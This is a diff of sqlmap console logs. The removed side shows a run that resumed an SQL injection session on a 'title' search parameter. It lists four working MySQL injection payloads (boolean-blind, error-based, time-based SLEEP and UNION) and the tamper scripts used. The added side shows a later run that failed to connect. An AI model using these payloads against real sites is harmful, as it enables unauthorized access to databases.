@@ -1,47 +1,19 @@
         ___
        __H__
- ___ ___[,]_____ ___ ___  {1.6.4.4#dev}
-|_ -| . [']     | .'| . |
-|___|_  ["]_|_|_|__,|  _|
+ ___ ___[,]_____ ___ ___  {1.6.5.5#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[*] starting @ 11:45:10 /2022-05-11/
+[*] starting @ 00:23:13 /2022-05-20/
 
-[11:45:10] [INFO] parsing HTTP request from 'c:\Users\siaht\Desktop\DATools\tools\scripts\sqlmap\sql.txt'
-[11:45:10] [INFO] loading tamper module 'commentbeforeparentheses'
-[11:45:10] [INFO] loading tamper module 'dunion'
-[11:45:10] [WARNING] tamper script 'dunion' is only meant to be run against Oracle
-it appears that you might have mixed the order of tamper scripts. Do you want to auto resolve this? [Y/n/q] Y
-[11:45:11] [WARNING] provided value for parameter 'title' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
-you provided 'PostgreSQL' as a back-end DBMS, but from a past scan information on the target URL sqlmap assumes the back-end DBMS is 'mysql'. Do you really want to force the back-end DBMS value? [y/N] N
-[11:45:11] [INFO] testing connection to the target URL
-[11:45:11] [WARNING] potential CAPTCHA protection mechanism detected
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: title (GET)
-    Type: boolean-based blind
-    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
-    Payload: title=fsdf' OR NOT 3315=3315#&action=search
+[00:23:13] [INFO] parsing HTTP request from 'c:\Users\24h\Desktop\DATools\tools\scripts\sqlmap\sql.txt'
+[00:23:13] [INFO] testing connection to the target URL
+[00:23:17] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[00:23:17] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or proxy switches ('--proxy', '--proxy-file'...)
+[00:23:30] [CRITICAL] unable to connect to the target URL
 
-    Type: error-based
-    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
-    Payload: title=fsdf' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170707671,(SELECT (ELT(4129=4129,1))),0x71707a7871,0x78))s), 8446744073709551610, 8446744073709551610)))-- XVCy&action=search
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: title=fsdf' AND (SELECT 5878 FROM (SELECT(SLEEP(5)))bMsL)-- vdqH&action=search
-
-    Type: UNION query
-    Title: MySQL UNION query (NULL) - 7 columns
-    Payload: title=fsdf' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170707671,0x48536f6447716c526d715258734c4f6e6862654371566f5a52786c45706e4b485652516b6244696b,0x71707a7871),NULL#&action=search
----
-[11:45:11] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
-[11:45:11] [INFO] testing PostgreSQL
-[11:45:11] [WARNING] identified ('PostgreSQL') and fingerprinted ('MySQL') DBMSes differ. If you experience problems in enumeration phase please rerun with '--flush-session'
-[11:45:11] [WARNING] the back-end DBMS is not PostgreSQL
-[11:45:11] [CRITICAL] sqlmap was not able to fingerprint the back-end database management system
-
-[*] ending @ 11:45:11 /2022-05-11/
+[*] ending @ 00:23:30 /2022-05-20/
 
